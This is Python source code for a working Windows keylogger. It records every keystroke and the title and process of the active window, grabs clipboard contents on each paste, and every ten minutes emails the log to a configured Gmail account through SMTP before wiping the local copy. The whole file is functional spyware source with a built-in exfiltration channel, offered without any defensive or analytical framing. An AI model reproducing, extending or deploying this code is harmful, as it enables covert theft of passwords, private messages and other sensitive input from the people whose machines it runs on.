import os
import sys
import time
import smtplib
import threading
from ctypes import windll, byref, create_unicode_buffer, c_ulong
import tkinter as tk
from tkinter import simpledialog, messagebox
from pynput import keyboard
import win32clipboard

class EmailSender:
    def __init__(self, email, app_password):
        self.email = email
        self.app_password = app_password
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587
    
    def send(self, subject, body):
        """Transmits the log as plain text via Gmail SMTP."""
        email_msg = f"Subject: {subject}\n\n{body}"
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.app_password)
                server.sendmail(self.email, self.email, email_msg.encode('utf-8'))
            return True
        except Exception:
            return False

class KeyLogger:
    def __init__(self, email=None, password=None, use_email=False):
        self.log_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_path = os.path.join(self.log_dir, "log.txt")
        self.user32 = windll.user32
        self.kernel32 = windll.kernel32
        self.psapi = windll.psapi
        self.current_window = None
        
        self.use_email = use_email 
        self.email = email
        self.sender = EmailSender(email, password) if use_email else None
        self.interval = 600

    def report(self):
        """Timer-based reporting loop."""
        if not self.use_email:
            return

        if os.path.exists(self.log_path):
            try:
                with open(self.log_path, "r", encoding="utf-8") as f:
                    log_content = f.read()
                if log_content.strip():
                    success = self.sender.send(f"Keylogger Report - {time.ctime()}", log_content)
                    if success:
                        with open(self.log_path, "w", encoding="utf-8") as f:
                            f.write(f"--- Log reset after email at {time.ctime()} ---\n")
            except Exception:
                pass
        
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def get_current_process(self):
        """Captures window info using Unicode Windows API."""
        hwnd = self.user32.GetForegroundWindow()
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        h_process = self.kernel32.OpenProcess(0x410, False, pid)
        if h_process:
            try:
                executable = create_unicode_buffer(512)
                self.psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)
                window_title = create_unicode_buffer(512)
                self.user32.GetWindowTextW(hwnd, byref(window_title), 512)
                if window_title.value != self.current_window:
                    self.current_window = window_title.value
                    header = f"\n\n[ PID: {pid.value} - {executable.value} - {self.current_window} ]\n"
                    with open(self.log_path, "a", encoding="utf-8") as f:
                        f.write(header)
            finally:
                self.kernel32.CloseHandle(h_process)

    def on_press(self, key):
        """Event handler for keystrokes and clipboard."""
        self.get_current_process()
        content = ""
        try:
            if hasattr(key, 'char') and key.char is not None:
                content = key.char 
            elif hasattr(key, 'vk') and 96 <= key.vk <= 105:
                content = str(key.vk - 96)
            else:
                key_str = str(key).replace('Key.', '')
                if key == keyboard.KeyCode.from_char('\x16'):
                    try:
                        win32clipboard.OpenClipboard()
                        clip_data = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        content = f"\n[PASTE] - {clip_data}\n"
                    except Exception:
                        content = " [PASTE ERROR] "
                else:
                    content = f" [{key_str}] " 
            
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(content)
        except Exception:
            pass

    def run(self):
        if self.use_email:
            self.report()
            
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def get_user_config():
    """GUI dialog for user configuration."""
    root = tk.Tk()
    root.withdraw()
    
    use_email = messagebox.askyesno(
        "Configuration", 
        "Would you like to send logs via Email?\n(Selecting 'No' will save logs locally only and disable auto-reset)"
    )
    
    email = None
    password = None
    
    if use_email:
        email = simpledialog.askstring("Configuration", "Receiver Email:")
        password = simpledialog.askstring("Configuration", "App Password (16-digits):", show='*')
        if not email or not password:
            root.destroy()
            return None, None, None
            
    root.destroy()
    return email, password, use_email

if __name__ == '__main__':
    email, password, use_email = get_user_config()
    
    if use_email is not None:
        logger = KeyLogger(email, password, use_email)
        try:
            logger.run()
        except (KeyboardInterrupt, SystemExit):
            pass